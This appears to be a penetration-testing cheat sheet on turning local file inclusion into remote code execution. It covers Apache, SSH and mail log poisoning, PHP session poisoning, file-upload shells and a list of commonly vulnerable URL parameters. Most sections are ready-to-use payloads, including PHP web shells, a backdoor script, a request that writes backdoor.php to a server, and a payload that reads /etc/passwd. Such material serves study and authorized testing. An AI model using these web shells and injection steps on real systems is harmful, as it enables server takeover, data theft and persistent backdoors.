# Remote Code Execution

![](https://media2.giphy.com/media/3orieNQgdcxedKjA3e/giphy.gif?cid=ecf05e47vcaxf58vv1mfubdyh4asgd6u8a0t54rnppx2k4o4\&rid=giphy.gif\&ct=g)

## Brief

{% hint style="info" %}
If an attacker **gains control** of a target computer through some sort of vulnerability, and they also gain the power to **execute commands on that remote computer** this process is called **Remote Code Execution (RCE)**

* It is one of the cyber-attacks where an attacker can remotely execute commands on someone’s computer
* It usually occurs due to malicious malware downloaded by the host and can happen regardless of the geographic location of the device.

**How is it possible ?**

_With RCE, hackers can edit or destroy important files, steal confidential data, perform DDoS (Distributed Denial of Service) attacks, and compromise the entire system._

**The attacks can be occurred due to:**

* _External user input unchecked_
* _Access control is poor_
* _Authentication measures are not properly done_
* _Buffer overflow._
{% endhint %}

## LFI 2 RCE

### LFI to RCE via Log files

{% hint style="info" %}
_a.k.a : log poisoning attack._

Used to gain remote command execution on the webserver.

The attacker needs to include a malicious payload into services log files such as - Apache, SSH, etc. Then, the LFI vulnerability is used to request the page that includes the malicious payload.

Exploiting this kind of attack depends on various factors, including the design of the web application and server configurations.

For example, a user can include a malicious payload into an apache log file via **User-Agent or other HTTP headers**. In SSH, the user can inject a malicious payload in the **username section**.
{% endhint %}

#### **How To**

**Apache Log Files**

```bash
# /var/log/apache2/access.log
# set inside the user agent or inside a GET parameter a php shell like :
<?php system($_GET['cmd']); ?>
# same for /proc/self/environ
```

**Via Emails**

```bash
# Send a mail to a internal account (user@localhost) containing : 
<?php echo system($_REQUEST["cmd"]); ?> 
# and access to the mail /var/mail/USER&cmd=whoami
```

**With SSH**

```bash
# ssh
ssh <?php system($_GET["cmd"]);?>@ip_address_server
# then look at /var/log/auth.log&cmd=whoami

# ftp
# you can do the same as ssh
# look at /var/log/messages
```

**Some PHP parameters used as user agent :**

```php
# php basic info
<?php phpinfo();?>
<?php system('id'); ?>

# php rce with cmd parameter
<?php system($_GET['cmd']); ?> //in user-agent burp or browser
<?php echo system($_GET['cmd']); ?> //in user-agent burp or browser
<?php system(\$_GET['cmd']); ?> //in user-agent curl 

    # to execute the RCE
     GET /example/exploit.php?command=id HTTP/1.1 

# php one-liner file reader
<?php echo file_get_contents('/path/to/target/file'); ?> 

//PHP Backdoor Code:
<?php

if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}

?>
```

### **Staged PHP RCE**

1. Confirm RCE (Using CMD + _whoami_/_id_ command)
2. Create a new **.php** file using `cmd=echo '<?php XXX ?> > backdoor.php'`

**How To :**

```bash
# creates a new php web file with RCE capabilities
cmd=echo '<?php system($_GET['cmd']); ?>' > backdoor.php

# Use & for two URL parameters ex:
http://0.0.0.0/index.php?file=app_access.log&cmd=whoami

http://10.10.49.156/index.php?err=./includes/logs/app_access.log&cmd=echo%20%27%3C?php%20system($_GET[%27cmd%27]);%20?%3E%27%20%3E%20backdoor.php
```

### LFI to RCE via PHP Sessions

**Enumerate** the PHP configuration file, and identify where the PHP sessions files are stored.

Then, we include a **PHP code** into the session and call the file via LFI.

Once located PHP session file storaging location, we can control the value of their session, it can be used to a chain exploit with an LFI to gain remote command execution.

It must stores the value of the username into the session even if you are not logged.

```bash
# Common locations that the PHP stores in sessions info :
c:\Windows\Temp
/tmp/
/var/lib/php5
/var/lib/php/session
```

## **File Upload Bypass 2 RCE**

```bash
# If you can upload a file, just inject the shell payload in it :
<?php system($_GET['c']); ?>
# check Web Vulnerabilities > File Upload Bypass for more techniques
# EXAMPLE : change MIME type to image/png
# access http://example.com/index.php?page=path/to/uploaded/file.php?c=id
# In order to keep the file readable it is best to inject into the metadata of the pictures/doc/pdf
```

## **PHP sessions**

```bash
# Check if the website use PHP Session (PHPSESSID)
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
# In PHP these sessions are stored into /var/lib/php5/sess\[PHPSESSID]_ files
# /var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
#user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
# Set the cookie to 
<?php system('cat /etc/passwd');?>

login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
# Use the LFI to include the PHP session file
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8
```

### TOP 25 vulnerable parameters

```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload
```

### Check also

* Apache log poisoning
* SSH log poisoning

{% embed url="https://www.exploit-db.com/papers/12885" %}
